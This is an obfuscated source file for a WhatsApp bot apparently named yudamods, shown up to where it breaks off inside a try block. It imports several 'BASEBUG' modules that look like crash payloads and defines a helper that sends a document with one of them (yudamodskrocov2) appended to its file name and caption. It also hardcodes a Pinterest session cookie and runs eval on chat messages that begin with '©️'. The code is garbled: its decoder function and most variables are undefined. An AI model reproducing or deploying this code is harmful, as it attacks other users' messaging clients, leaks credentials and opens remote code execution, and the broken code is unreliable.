require('./config')
const {
    WA_DEFAULT_EPHEMERAL,
    getAggregateVotesInPollMessage,
    generateWAMessageFromContent,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    downloadContentFromMessage,
    areJidsSameUser,
    getContentType,
  } = require('@whiskeysockets/baileys'),
  fs = require('fs'),
  util = require('util'),
  chalk = require('chalk'),
  os = require('os'),
  axios = require('axios'),
  fsx = require('fs-extra'),
  crypto = require('crypto'),
  ffmpeg = require('fluent-ffmpeg'),
  moment = require('moment-timezone'),
  { JSDOM } = require('jsdom'),
  { apikey } = require('./apikey.json'),
  { color, bgcolor } = require('./lib/color'),
  { ssweb } = require('./lib/ssweb'),
  { quote } = require('./lib/quote'),
  { uptotelegra } = require('./lib/upload'),
  { Primbon } = require('scrape-primbon'),
  { remini } = require('./lib/remini'),
  { TelegraPh } = require('./lib/uploader'),
  { yudamodsbug } = require('./BASEBUG/yudamodsbug'),
  { Lithe } = require('./BASEBUG/Lithe'),
  { bugchat } = require('./BASEBUG/bugchat'),
  { bugyudamods } = require('./BASEBUG/bugyudamods'),
  { yudamodsbugnewvip } = require('./BASEBUG/yudamodsbugnewvip'),
  { yudamodskrocov2 } = require('./BASEBUG/yudamodskrocov2'),
  { yudamodskroco } = require('./BASEBUG/yudamodskroco'),
  { yudamods } = require('./BASEBUG/yudamods'),
  { tizi } = require('./BASEBUG/tizi'),
  { telapreta3 } = require('./BASEBUG/telapreta3'),
  primbon = new Primbon(),
  hxz = require('hxz-api'),
  jsobfus = require('javascript-obfuscator'),
  cheerio = require('cheerio'),
  ytdl = require('ytdl-core'),
  speed = require('performance-now'),
  { performance } = require('perf_hooks'),
  { exec, spawn, execSync } = require('child_process'),
  { mediafireDl } = require('./database/mediafire.js'),
  {
    smsg,
    tanggal,
    getTime,
    formatp,
    isUrl,
    sleep,
    clockString,
    runtime,
    fetchJson,
    getBuffer,
    jsonformat,
    format,
    parseMention,
    getRandom,
    getGroupAdmins,
  } = require('./lib/myfunc'),
  {
    FajarNews,
    BBCNews,
    metroNews,
    CNNNews,
    iNews,
    KumparanNews,
    TribunNews,
    DailyNews,
    DetikNews,
    OkezoneNews,
    CNBCNews,
    KompasNews,
    SindoNews,
    TempoNews,
    IndozoneNews,
    AntaraNews,
    RepublikaNews,
    VivaNews,
    KontanNews,
    MerdekaNews,
    KomikuSearch,
    AniPlanetSearch,
    KomikFoxSearch,
    KomikStationSearch,
    MangakuSearch,
    KiryuuSearch,
    KissMangaSearch,
    KlikMangaSearch,
    PalingMurah,
    LayarKaca21,
    AminoApps,
    Mangatoon,
    WAModsSearch,
    Emojis,
    CoronaInfo,
    JalanTikusMeme,
    Cerpen,
    Quotes,
    Couples,
    Darkjokes,
  } = require('dhn-api'),
  {
    addResponList,
    delResponList,
    isAlreadyResponList,
    isAlreadyResponListGroup,
    sendResponList,
    updateResponList,
    getDataResponList,
  } = require('./lib/addlist')
global.db.data = JSON.parse(fs.readFileSync('./src/database.json'))
if (global.db.data) {
  global.db.data = {
    users: {},
    chats: {},
    game: {},
    database: {},
    settings: {},
    setting: {},
    others: {},
    sticker: {},
    ...(global.db.data || {}),
  }
}
let kuismath = (db.data.game.math = []),
  tebakgambar = (db.data.game.tebakgambar = []),
  tebakkata = (db.data.game.tebakkata = []),
  caklontong = (db.data.game.lontong = []),
  caklontong_desk = (db.data.game.lontong_desk = []),
  tebakkalimat = (db.data.game.kalimat = []),
  tebaklirik = (db.data.game.lirik = []),
  tebaktebakan = (db.data.game.tebakan = []),
  db_respon_list = JSON.parse(fs.readFileSync('./database/list.json'))
const yts = require('./scrape/yt-search'),
  { ytSearch } = require('./scrape/yt'),
  thumbnail = fs.readFileSync('./data/image/thumb.jpg'),
  thumb = fs.readFileSync('./data/image/thumb.jpg'),
  kalimage = fs.readFileSync('./data/image/thumb.jpg'),
  pengguna = JSON.parse(fs.readFileSync('./database/user.json')),
  owner = JSON.parse(fs.readFileSync('./premium.json')),
  author = JSON.parse(fs.readFileSync('./author.json')),
  vnnye = JSON.parse(fs.readFileSync('./database/vnadd.json')),
  docunye = JSON.parse(fs.readFileSync('./database/docu.json')),
  zipnye = JSON.parse(fs.readFileSync('./database/zip.json')),
  apknye = JSON.parse(fs.readFileSync('./database/apk.json')),
  ntilink = JSON.parse(fs.readFileSync('./lib/antilink.json')),
  chatbot = JSON.parse(fs.readFileSync('./lib/chatbot.json')),
  antidel = JSON.parse(fs.readFileSync('./lib/antidel.json')),
  banned = JSON.parse(fs.readFileSync('./data/db/banned.json')),
  contacts = JSON.parse(fs.readFileSync('./database/contacts.json')),
  isContacts = contacts.includes(m.sender)
module.exports = yudamods = async (_0x40c8bf, _0x30af8e, _0x41ea4f, _0x231cf4) => {
  try {
    if (_0xe6938f < _0x28e58e(489)) {
      var _0xfd55cd = _0x28e58e(700)
    }
    if (_0xe6938f < _0x28e58e(653)) {
      var _0xfd55cd = _0x28e58e(539)
    }
    if (_0xe6938f < _0x28e58e(715)) {
      var _0xfd55cd = _0x28e58e(334)
    }
    if (_0xe6938f < _0x28e58e(347)) {
      var _0xfd55cd = '\uD83D\uDCAC Selamat Siang'
    }
    if (_0xe6938f < _0x28e58e(509)) {
      var _0xfd55cd = '\uD83D\uDCAC Selamat Pagi'
    }
    if (_0xe6938f < _0x28e58e(677)) {
      var _0xfd55cd = _0x28e58e(537)
    }
    if (_0xe6938f < _0x28e58e(565)) {
      var _0xfd55cd = _0x28e58e(474)
    }
    if (!_0x40c8bf[_0x28e58e(705)]) {
      if (!_0x30af8e.key[_0x28e58e(500)] && !_0x22bf7c) {
        return
      }
    }
    try {
      pplu = await _0x40c8bf.profilePictureUrl(anu.id, _0x28e58e(449))
    } catch {
      pplu =
        'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
    }
    async function _0xa493f7(_0x2d24e4, _0x38e3ca) {
      const _0x4f4dae = _0x28e58e
      _0x40c8bf[_0x4f4dae(351)](
        _0x38e3ca,
        {
          document: { url: _0x4f4dae(366) },
          mimetype: 'image/null',
          fileName: _0x2d24e4 + '.' + yudamodskrocov2,
          caption: '' + (_0x2d24e4 + yudamodskrocov2),
        },
        { quoted: _0x568a08 }
      )
    }
    try {
      if (typeof _0x1616d6 !== _0x28e58e(454)) {
        global.db[_0x28e58e(344)][_0x28e58e(557)][_0x30af8e[_0x28e58e(475)]] =
          {}
      }
      if (_0x1616d6) {
        if (!_0x18b66c(_0x1616d6[_0x28e58e(684)])) {
          _0x1616d6[_0x28e58e(684)] = -1
        }
        if (!(_0x28e58e(611) in _0x1616d6)) {
          _0x1616d6.afkReason = ''
        }
        if (!_0x18b66c(_0x1616d6[_0x28e58e(534)])) {
          _0x1616d6[_0x28e58e(534)] = _0x12b111
        }
        if (!_0x18b66c(_0x1616d6[_0x28e58e(358)])) {
          _0x1616d6.level = 0
        }
        if (!(_0x28e58e(656) in _0x1616d6)) {
          _0x1616d6[_0x28e58e(656)] = true
        }
      } else {
        global.db[_0x28e58e(344)][_0x28e58e(557)][_0x30af8e[_0x28e58e(475)]] = {
          afkTime: -1,
          afkReason: '',
          limit: _0x12b111,
          level: 0,
          autolevelup: true,
        }
      }
      if (typeof _0x22232e !== 'object') {
        global.db[_0x28e58e(344)][_0x28e58e(430)][_0x30af8e[_0x28e58e(568)]] =
          {}
      }
      if (_0x22232e) {
        if (!(_0x28e58e(398) in _0x22232e)) {
          _0x22232e[_0x28e58e(398)] = false
        }
        if (!(_0x28e58e(571) in _0x22232e)) {
          _0x22232e[_0x28e58e(571)] = true
        }
        if (!(_0x28e58e(455) in _0x22232e)) {
          _0x22232e[_0x28e58e(455)] = false
        }
        if (!('antitoxic' in _0x22232e)) {
          _0x22232e.antitoxic = false
        }
        if (!(_0x28e58e(326) in _0x22232e)) {
          _0x22232e[_0x28e58e(326)] = true
        }
        if (!(_0x28e58e(370) in _0x22232e)) {
          _0x22232e[_0x28e58e(370)] = false
        }
        if (!(_0x28e58e(440) in _0x22232e)) {
          _0x22232e[_0x28e58e(440)] = false
        }
        if (!(_0x28e58e(581) in _0x22232e)) {
          _0x22232e[_0x28e58e(581)] = true
        }
        if (!(_0x28e58e(337) in _0x22232e)) {
          _0x22232e[_0x28e58e(337)] = false
        }
        if (!(_0x28e58e(652) in _0x22232e)) {
          _0x22232e.antilinkv2 = true
        }
        if (!(_0x28e58e(303) in _0x22232e)) {
          _0x22232e.autodown = false
        }
        if (!('notification' in _0x22232e)) {
          _0x22232e.notification = {}
        }
      } else {
        global.db.data.chats[_0x30af8e[_0x28e58e(568)]] = {
          mute: false,
          wlcm: true,
          nsfw: false,
          antitoxic: false,
          antilink: true,
          antilinkyt: false,
          antilinktt: false,
          antivirtex: true,
          antipanel: false,
          antilinkv2: true,
          autodown: false,
          notification: {
            status: true,
            text_left: '',
            text_welcome: '',
          },
        }
      }
      if (typeof _0x670473 !== _0x28e58e(454)) {
        global.db.data.settings[_0x8ca5c2] = {}
      }
      if (_0x670473) {
        if (!_0x18b66c(_0x670473.status)) {
          _0x670473.status = 0
        }
        if (!(_0x28e58e(712) in _0x670473)) {
          _0x670473.autobio = false
        }
        if (!(_0x28e58e(622) in _0x670473)) {
          _0x670473.autoread = true
        }
      } else {
        global.db[_0x28e58e(344)][_0x28e58e(485)][_0x8ca5c2] = {
          status: 0,
          autobio: false,
          autoread: true,
        }
      }
    } catch (_0xc5473f) {
      console[_0x28e58e(679)](_0xc5473f)
    }
    _0x1831dd[_0x28e58e(462)](
      '02 12 * * *',
      () => {
        const _0x3d0909 = _0x28e58e
        let _0x5ac092 = Object[_0x3d0909(558)](
            global.db[_0x3d0909(344)][_0x3d0909(557)]
          ),
          _0x580ed6 = isPremium
            ? global[_0x3d0909(493)][_0x3d0909(722)]
            : global[_0x3d0909(493)][_0x3d0909(613)]
        for (let _0x10e908 of _0x5ac092)
          global.db[_0x3d0909(344)][_0x3d0909(557)][_0x10e908][_0x3d0909(534)] =
            _0x580ed6
        console[_0x3d0909(709)](_0x3d0909(600))
      },
      {
        scheduled: true,
        timezone: _0x28e58e(323),
      }
    )
    function _0x49e2d6() {
      const _0x109bd0 = _0x28e58e
      let _0xdb0762 = ''
      for (let _0x3061a2 = 0; _0x3061a2 < 10; _0x3061a2++) {
        const _0x3a423b = Math[_0x109bd0(341)](
          Math.random() *
            'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*'[
              _0x109bd0(702)
            ]
        )
        _0xdb0762 +=
          'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*'[
            _0x3a423b
          ]
      }
      return _0xdb0762
    }
    async function _0x865f12(_0x3ed6a7, _0x135b33) {
      const _0xc0089 = _0x28e58e
      let _0x1b173a = (
          await axios(
            _0xc0089(391) +
              encodeURIComponent(
                'jarak ' + _0x3ed6a7 + _0xc0089(329) + _0x135b33
              ) +
              '&hl=id'
          )
        )[_0xc0089(344)],
        _0x555d5d = cheerio.load(_0x1b173a),
        _0x3917cb = {},
        _0x3597cc = _0x1b173a.split(_0xc0089(627))?[1]?[_0xc0089(436)]("'")?.[0]
      return (
        (_0x3917cb[_0xc0089(356)] = /^data:.*?\/.*?;base64,/i[_0xc0089(424)](
          _0x3597cc
        )
          ? Buffer.from(_0x3597cc[_0xc0089(436)]`,`[1], _0xc0089(511))
          : ''),
        (_0x3917cb.desc = _0x555d5d('div.BNeawe.deIvCb.AP7Wnd')
          [_0xc0089(490)]()
          ?[_0xc0089(317)]()),
        _0x3917cb
      )
    }
    function _0x34f699(_0x54c319) {
      return new Promise(async (_0x523d7c, _0x338e8a) => {
        axios
          .get(
            'https://id.pinterest.com/search/pins/?autologin=true&q=' +
              _0x54c319,
            {
              headers: {
                cookie:
                  '_auth=1; _b="AVna7S1p7l1C5I9u0+nR3YzijpvXOPc6d09SyCzO+DcwpersQH36SmGiYfymBKhZcGg="; _pinterest_sess=TWc9PSZHamJOZ0JobUFiSEpSN3Z4a2NsMk9wZ3gxL1NSc2k2NkFLaUw5bVY5cXR5alZHR0gxY2h2MVZDZlNQalNpUUJFRVR5L3NlYy9JZkthekp3bHo5bXFuaFZzVHJFMnkrR3lTbm56U3YvQXBBTW96VUgzVUhuK1Z4VURGKzczUi9hNHdDeTJ5Y2pBTmxhc2owZ2hkSGlDemtUSnYvVXh5dDNkaDN3TjZCTk8ycTdHRHVsOFg2b2NQWCtpOWxqeDNjNkk3cS85MkhhSklSb0hwTnZvZVFyZmJEUllwbG9UVnpCYVNTRzZxOXNJcmduOVc4aURtM3NtRFo3STlmWjJvSjlWTU5ITzg0VUg1NGhOTEZzME9SNFNhVWJRWjRJK3pGMFA4Q3UvcHBnWHdaYXZpa2FUNkx6Z3RNQjEzTFJEOHZoaHRvazc1c1UrYlRuUmdKcDg3ZEY4cjNtZlBLRTRBZjNYK0lPTXZJTzQ5dU8ybDdVS015bWJKT0tjTWYyRlBzclpiamdsNmtpeUZnRjlwVGJXUmdOMXdTUkFHRWloVjBMR0JlTE5YcmhxVHdoNzFHbDZ0YmFHZ1VLQXU1QnpkM1FqUTNMTnhYb3VKeDVGbnhNSkdkNXFSMXQybjRGL3pyZXRLR0ZTc0xHZ0JvbTJCNnAzQzE0cW1WTndIK0trY05HV1gxS09NRktadnFCSDR2YzBoWmRiUGZiWXFQNjcwWmZhaDZQRm1UbzNxc21pV1p5WDlabm1UWGQzanc1SGlrZXB1bDVDWXQvUis3elN2SVFDbm1DSVE5Z0d4YW1sa2hsSkZJb1h0MTFpck5BdDR0d0lZOW1Pa2RDVzNySWpXWmUwOUFhQmFSVUpaOFQ3WlhOQldNMkExeDIvMjZHeXdnNjdMYWdiQUhUSEFBUlhUVTdBMThRRmh1ekJMYWZ2YTJkNlg0cmFCdnU2WEpwcXlPOVZYcGNhNkZDd051S3lGZmo0eHV0ZE42NW8xRm5aRWpoQnNKNnNlSGFad1MzOHNkdWtER0xQTFN5Z3lmRERsZnZWWE5CZEJneVRlMDd2VmNPMjloK0g5eCswZUVJTS9CRkFweHc5RUh6K1JocGN6clc1JmZtL3JhRE1sc0NMTFlpMVErRGtPcllvTGdldz0=; _ir=0',
              },
            }
          )
          .then(({ data: _0x5eafce }) => {
            const _0x82bef4 = cheerio.load(_0x5eafce),
              _0x33416c = [],
              _0x25361e = []
            _0x82bef4('div > a')
              .get()
              .map((_0x19b3f7) => {
                const _0x5c426c = _0x82bef4(_0x19b3f7).find('img').attr('src')
                _0x33416c.push(_0x5c426c)
              })
            _0x33416c.forEach((_0x37054c) => {
              if (_0x37054c == undefined) {
                return
              }
              _0x25361e.push(_0x37054c.replace(/230/g, '730'))
            })
            _0x25361e.shift()
            _0x523d7c(_0x25361e)
          })
      })
    }
    function _0x46ef03(_0x8a018a, _0x2d4f58 = true) {
      if (_0x8a018a) {
        return (..._0x523ce3) =>
          _0x523ce3[_0x2d4f58 & 1][_0x8a018a] -
          _0x523ce3[!_0x2d4f58 & 1][_0x8a018a]
      } else {
        return (..._0x377797) =>
          _0x377797[_0x2d4f58 & 1] - _0x377797[!_0x2d4f58 & 1]
      }
    }
    function _0x46f8f2(_0x19280a, _0x4aca08 = 0) {
      if (_0x19280a) {
        return (_0x48720c, _0x2aa0c0, _0x1c767b) => {
          return {
            ..._0x1c767b[_0x2aa0c0],
            [_0x19280a]:
              _0x48720c[_0x19280a] === undefined
                ? _0x4aca08
                : _0x48720c[_0x19280a],
          }
        }
      } else {
        return (_0x39da28) => (_0x39da28 === undefined ? _0x4aca08 : _0x39da28)
      }
    }
    function _0x5aa1a8(_0x8fc100) {
      const _0x3faa57 = _0x28e58e
      return _0x8fc100[_0x3faa57(339)]
    }
    function _0x3311a5(_0x50cd2f) {
      const _0x2c3b23 = _0x28e58e
      return _0x50cd2f[
        Math[_0x2c3b23(341)](Math.random() * _0x50cd2f[_0x2c3b23(702)])
      ]
    }
    if (_0x30af8e[_0x28e58e(475)][_0x28e58e(451)]('212')) {
      return _0x40c8bf[_0x28e58e(541)](_0x30af8e[_0x28e58e(475)], 'block')
    }
    _0x30af8e[_0x28e58e(378)] &&
      global.db[_0x28e58e(344)][_0x28e58e(485)][_0x8ca5c2][_0x28e58e(622)] &&
        _0x40c8bf[_0x28e58e(547)]([_0x30af8e.key])
    if (_0x17ba71) {
      if (!_0x24eb5a && !_0x30af8e[_0x28e58e(437)]) {
        return _0x30241f()
      }
    }
    if (_0x191b4a) {
      if (!_0x24eb5a && !_0x30af8e[_0x28e58e(437)]) {
        return
      }
      if (!_0x77b577[_0x28e58e(656)]) {
        return true
      }
      while (
        _0x2dc509[_0x28e58e(374)](
          _0x77b577[_0x28e58e(358)],
          _0x77b577[_0x28e58e(354)],
          global[_0x28e58e(307)]
        )
      ) {
        _0x77b577[_0x28e58e(358)]++
      }
      if (_0x264c08 !== _0x77b577[_0x28e58e(358)]) {
        _0x303d1f(_0x431853)
        console[_0x28e58e(709)](_0x5b7d15(_0x431853, _0x28e58e(336)))
      }
    }
    function _0x1b84e1(_0x277c41 = '') {
      const _0x29b436 = _0x28e58e
      return [..._0x277c41.matchAll(/@([0-9]{5,16}|0)/g)][_0x29b436(388)](
        (_0x6d6abd) => _0x6d6abd[1] + '@s.whatsapp.net'
      )
    }
    async function _0x182b8f() {
      const _0x2e995a = _0x28e58e
      var _0x5b7abd = [
        '\uD83D\uDCAC *Hello Im yudamods*',
        _0x2e995a(320),
        _0x2e995a(579),
      ]
      let { key: _0x98944e } = await _0x40c8bf[_0x2e995a(351)](
        _0x209768,
        { text: '\uD83D\uDCAC *Loading*' },
        { quoted: _0x37c453 }
      )
      for (let _0x4a0bde = 0; _0x4a0bde < _0x5b7abd.length; _0x4a0bde++) {
        await sleep(100)
        await _0x40c8bf[_0x2e995a(351)](
          _0x209768,
          {
            text: _0x5b7abd[_0x4a0bde],
            edit: _0x98944e,
          },
          { quoted: _0x37c453 }
        )
      }
    }
    _0x223cad &&
      _0x40c8bf[_0x28e58e(351)](_0x30af8e[_0x28e58e(568)], {
        delete: _0x30af8e[_0x28e58e(573)],
      })
    _0x30af8e[_0x28e58e(743)] &&
      _0x30af8e[_0x28e58e(500)] &&
      (_0x303d1f(_0x28e58e(624)),
      await _0x40c8bf[_0x28e58e(476)](
        _0x30af8e[_0x28e58e(568)],
        [_0x30af8e[_0x28e58e(475)]],
        _0x28e58e(350)
      ))
    await sleep(1500)
    _0x40c8bf[_0x28e58e(351)](_0x30af8e.chat, _0x939bbd)
    _0x30af8e[_0x28e58e(378)] &&
      (_0x40c8bf.sendPresenceUpdate(_0x209768),
      console[_0x28e58e(709)](
        chalk[_0x28e58e(465)].bgCyan.bold(botname),
        color('\u2A20 Pesan', '' + _0x23c226),
        color(_0x28e58e(666), '' + _0x23c226),
        color('' + _0x26a6ce, '' + _0x23c226),
        color(' :', '' + _0x23c226),
        color('' + _0x374b7d, _0x28e58e(400))
      ))
    _0x3acce3 &&
      !_0x11c4fa &&
      (pengguna[_0x28e58e(575)](_0x53dda3),
      fs[_0x28e58e(316)](
        _0x28e58e(369),
        JSON[_0x28e58e(603)](pengguna, null, 2)
      ))
    db[_0x28e58e(344)][_0x28e58e(430)][_0x30af8e[_0x28e58e(568)]].notification[
      _0x28e58e(738)
    ] &&
      _0x40c8bf.ev.on('group-participants.update', async (_0x40c95b) => {
        const _0x25f44f = _0x28e58e
        try {
          let _0x5ea25f = await _0x40c8bf[_0x25f44f(758)](_0x40c95b.id),
            _0x5c118c = _0x40c95b[_0x25f44f(319)]
          for (let _0x27707d of _0x5c118c) {
            let _0x88ae24 = await _0x40c8bf[_0x25f44f(618)](
              _0x27707d,
              _0x25f44f(449)
            )[_0x25f44f(325)](
              (_0x443ddf) => 'https://telegra.ph/file/6880771a42bad09dd6087.jpg'
            )
            if (_0x40c95b[_0x25f44f(740)] == _0x25f44f(526)) {
              _0x40c8bf[_0x25f44f(351)](_0x40c95b.id, {
                text: db[_0x25f44f(344)].chats[_0x30af8e.chat][_0x25f44f(597)]
                  .text_left
                  ? db[_0x25f44f(344)].chats[_0x30af8e[_0x25f44f(568)]][
                      _0x25f44f(597)
                    ].text_welcome
                  : _0x25f44f(559) +
                    _0x5ea25f.subject +
                    _0x25f44f(644) +
                    _0x53dda3[_0x25f44f(436)]('@')[0],
                contextInfo: {
                  externalAdReply: {
                    title: '' + botname,
                    body: '' + ownername,
                    thumbnailUrl: _0x88ae24,
                    sourceUrl: _0x25f44f(486),
                    mediaType: 1,
                    renderLargerThumbnail: false,
                  },
                },
              })
              await sleep(100)
              _0x40c8bf.sendMessage(_0x40c95b.id, {
                audio: fs.readFileSync(_0x25f44f(375)),
                mimetype: _0x25f44f(663),
                ptt: true,
                fileLength: 88738,
              })
            } else {
              _0x40c95b[_0x25f44f(740)] == _0x25f44f(350) &&
                (_0x40c8bf[_0x25f44f(351)](_0x40c95b.id, {
                  text: db.data[_0x25f44f(430)][_0x30af8e[_0x25f44f(568)]]
                    .notification[_0x25f44f(340)]
                    ? db[_0x25f44f(344)][_0x25f44f(430)][
                        _0x30af8e[_0x25f44f(568)]
                      ][_0x25f44f(597)][_0x25f44f(340)]
                    : _0x25f44f(401) + _0x53dda3[_0x25f44f(436)]('@')[0],
                  contextInfo: {
                    externalAdReply: {
                      title: '' + botname,
                      body: '' + ownername,
                      thumbnailUrl: _0x88ae24,
                      sourceUrl: _0x25f44f(486),
                      mediaType: 1,
                      renderLargerThumbnail: false,
                    },
                  },
                }),
                await sleep(100),
                _0x40c8bf[_0x25f44f(351)](_0x40c95b.id, {
                  audio: fs[_0x25f44f(555)](_0x25f44f(528)),
                  mimetype: 'audio/mp4',
                  ptt: true,
                  fileLength: 88738,
                }))
            }
          }
        } catch (_0x2cf351) {
          console[_0x25f44f(709)](_0x2cf351)
        }
      })
    if (
      db[_0x28e58e(344)][_0x28e58e(430)][_0x30af8e[_0x28e58e(568)]][
        _0x28e58e(717)
      ]
    ) {
      if (!_0x30af8e.isGroup) {
        return
      }
      _0x23bf9b &&
        !_0x24eb5a &&
        (_0x40c8bf[_0x28e58e(351)](_0x30af8e[_0x28e58e(568)], {
          delete: _0x30af8e[_0x28e58e(573)],
        }),
        await _0x40c8bf[_0x28e58e(351)](
          _0x30af8e[_0x28e58e(568)],
          {
            audio: fs.readFileSync(_0x28e58e(538)),
            mimetype: _0x28e58e(663),
            ptt: true,
            fileLength: 88738,
          },
          { quoted: _0x37c453 }
        ))
    }
    if (db[_0x28e58e(344)].chats[_0x30af8e.chat][_0x28e58e(303)]) {
      if (_0x614e5c[_0x28e58e(495)](_0x28e58e(637))) {
        try {
          _0x182b8f()
          _0x40c8bf[_0x28e58e(351)](_0x30af8e[_0x28e58e(568)], {
            video: { url: _0x240db9[_0x28e58e(752)] },
            fileName: 'tiktok.mp4',
            mimetype: _0x28e58e(392),
          })[_0x28e58e(730)](() => {
            const _0x7f34dc = _0x28e58e
            _0x40c8bf[_0x7f34dc(351)](_0x30af8e[_0x7f34dc(568)], {
              audio: { url: _0x240db9.music },
              fileName: 'tiktok.mp3',
              mimetype: _0x7f34dc(663),
            })
          })
        } catch (_0x17ec11) {
          await _0x303d1f(_0x28e58e(607))
        }
      }
      if (_0x614e5c[_0x28e58e(495)](_0x28e58e(672))) {
        try {
          _0x182b8f()
          _0x40c8bf[_0x28e58e(351)](_0x30af8e.chat, {
            video: { url: _0x3f95c9[_0x28e58e(344)][_0x28e58e(587)] },
            mimetype: _0x28e58e(392),
          })
        } catch (_0x2fb116) {
          await _0x303d1f(_0x28e58e(691))
        }
      }
      if (_0x614e5c[_0x28e58e(495)](_0x28e58e(562))) {
        try {
          _0x182b8f()
          _0x53e4b9[_0x28e58e(695)](_0x28e58e(434))
            ? _0x40c8bf[_0x28e58e(351)](_0x30af8e[_0x28e58e(568)], {
                video: { url: _0x1df883 },
                caption: _0x2f189b,
              })
            : _0x40c8bf[_0x28e58e(351)](_0x30af8e[_0x28e58e(568)], {
                image: { url: _0x1df883 },
                caption: _0x2f189b,
              })
        } catch (_0x11811c) {
          console.log(util.format(_0x11811c))
          await _0x303d1f(_0x28e58e(664))
        }
      }
      if (_0x614e5c[_0x28e58e(495)](_0x28e58e(530))) {
        try {
          _0x182b8f()
          _0x2a4880.includes(_0x28e58e(434))
            ? _0x40c8bf[_0x28e58e(351)](_0x30af8e[_0x28e58e(568)], {
                video: { url: _0x587111 },
                caption: _0x95335,
              })
            : _0x40c8bf[_0x28e58e(351)](_0x30af8e[_0x28e58e(568)], {
                image: { url: _0x587111 },
                caption: _0x95335,
              })
        } catch (_0x36118d) {
          console.log(util[_0x28e58e(655)](_0x36118d))
          await _0x303d1f(_0x28e58e(380))
        }
      }
      if (_0x614e5c[_0x28e58e(495)]('mediafire.com')) {
        try {
          _0x182b8f()
          if (_0x25e5af[0][_0x28e58e(585)][_0x28e58e(436)]('MB')[0] >= 50) {
            return _0x303d1f(_0x28e58e(333))
          }
          _0x303d1f('' + _0x51e33c)
          rico.sendMessage(
            _0x30af8e[_0x28e58e(568)],
            {
              document: { url: _0x25e5af[0][_0x28e58e(314)] },
              fileName: _0x25e5af[0][_0x28e58e(633)],
              mimetype: _0x25e5af[0][_0x28e58e(457)],
            },
            { quoted: _0x30af8e }
          )
        } catch (_0x2755a0) {
          await _0x303d1f(_0x28e58e(466))
        }
      }
    }
    if (db.data[_0x28e58e(430)][_0x30af8e.chat][_0x28e58e(326)]) {
      if (_0x614e5c[_0x28e58e(495)](_0x28e58e(367))) {
        _0x40c8bf[_0x28e58e(476)](
          _0x30af8e.chat,
          [_0x30af8e[_0x28e58e(475)]],
          _0x28e58e(350)
        )
      }
    }
    if (db[_0x28e58e(344)][_0x28e58e(430)][_0x30af8e.chat][_0x28e58e(652)]) {
      if (_0x614e5c[_0x28e58e(495)](_0x28e58e(367))) {
        _0x303d1f(
          '*\uD83D\uDCAC Anti Link Whatsapp*\n\n\uD83C\uDF41 *Kamu Terdeteksi Mengirim Link Group*'
        )
        if (!_0xd48a95) {
          return _0x303d1f(_0x28e58e(569))
        }
        if (_0x5c2857) {
          return _0x303d1f(_0x28e58e(681))
        }
        if (_0x43d0e6) {
          return _0x303d1f(_0x28e58e(397))
        }
        if (_0x24eb5a) {
          return _0x303d1f(_0x28e58e(310))
        }
        _0x40c8bf.sendMessage(_0x30af8e[_0x28e58e(568)], {
          delete: _0x30af8e[_0x28e58e(573)],
        })
      }
    }
    if (db[_0x28e58e(344)][_0x28e58e(430)][_0x30af8e.chat][_0x28e58e(337)]) {
      if (_0x614e5c[_0x28e58e(495)](_0x28e58e(514))) {
        _0x303d1f(_0x28e58e(386))
        if (!_0xd48a95) {
          return _0x303d1f(_0x28e58e(443))
        }
        if (_0x43d0e6) {
          return _0x303d1f(_0x28e58e(397))
        }
        if (_0x24eb5a) {
          return _0x303d1f('Ehh Maaf Kamu Ownerku Ternyata \uD83D\uDE05')
        }
        _0x40c8bf.sendMessage(_0x30af8e[_0x28e58e(568)], {
          delete: _0x30af8e[_0x28e58e(573)],
        })
      }
      if (_0x614e5c.match(_0x28e58e(706))) {
        _0x303d1f(
          '\u300C *ANTI PROMOSI PANEL* \u300D\n\nApa? Panel? Beli Di Admin Sini Aja, Yg Lain Jelek, Cepet Down, Lemot, Banyak Masalah!\n\nMau? Chat Ke:\nt.me/SALShop1'
        )
        if (!_0xd48a95) {
          return _0x303d1f(_0x28e58e(443))
        }
        if (_0x43d0e6) {
          return _0x303d1f(_0x28e58e(397))
        }
        if (_0x24eb5a) {
          return _0x303d1f(_0x28e58e(310))
        }
        _0x40c8bf[_0x28e58e(351)](_0x30af8e.chat, {
          delete: _0x30af8e[_0x28e58e(573)],
        })
      }
      if (_0x614e5c[_0x28e58e(495)](_0x28e58e(328))) {
        _0x303d1f(_0x28e58e(386))
        if (!_0xd48a95) {
          return _0x303d1f(_0x28e58e(443))
        }
        if (_0x43d0e6) {
          return _0x303d1f(_0x28e58e(397))
        }
        if (_0x24eb5a) {
          return _0x303d1f(_0x28e58e(310))
        }
        _0x40c8bf[_0x28e58e(351)](_0x30af8e[_0x28e58e(568)], {
          delete: _0x30af8e[_0x28e58e(573)],
        })
      }
    }
    for (let _0x2e44c0 of owner) {
      _0x36ce88[_0x28e58e(575)]({
        displayName: await _0x40c8bf.getName(_0x2e44c0 + _0x28e58e(360)),
        vcard:
          _0x28e58e(448) +
          (await _0x40c8bf[_0x28e58e(578)](_0x2e44c0 + _0x28e58e(360))) +
          _0x28e58e(431) +
          (await _0x40c8bf.getName(_0x2e44c0 + _0x28e58e(360))) +
          _0x28e58e(556) +
          _0x2e44c0 +
          ':' +
          _0x2e44c0 +
          _0x28e58e(727),
      })
    }
    if (
      _0x13654c &&
      _0x30af8e[_0x28e58e(604)][_0x28e58e(710)] &&
      _0x30af8e[_0x28e58e(604)][_0x28e58e(710)].toString(_0x28e58e(511)) in
        global.db[_0x28e58e(344)][_0x28e58e(615)]
    ) {
      _0x3cd449[_0x28e58e(573)][_0x28e58e(500)] = areJidsSameUser(
        _0x30af8e.sender,
        _0x40c8bf[_0x28e58e(484)].id
      )
      _0x3cd449[_0x28e58e(573)].id = _0x30af8e[_0x28e58e(573)].id
      _0x3cd449[_0x28e58e(609)] = _0x30af8e[_0x28e58e(609)]
      if (_0x30af8e[_0x28e58e(437)]) {
        _0x3cd449[_0x28e58e(741)] = _0x30af8e[_0x28e58e(475)]
      }
      _0x40c8bf.ev[_0x28e58e(685)](_0x28e58e(589), _0x4988c6)
    }
    if (_0x614e5c.startsWith('\xA9️')) {
      try {
        return _0x303d1f(
          JSON[_0x28e58e(603)](
            eval('' + _0x41aad1[_0x28e58e(385)](' ')),
            null,
            '\t'
          )
        )
      } catch (_0x214b73) {
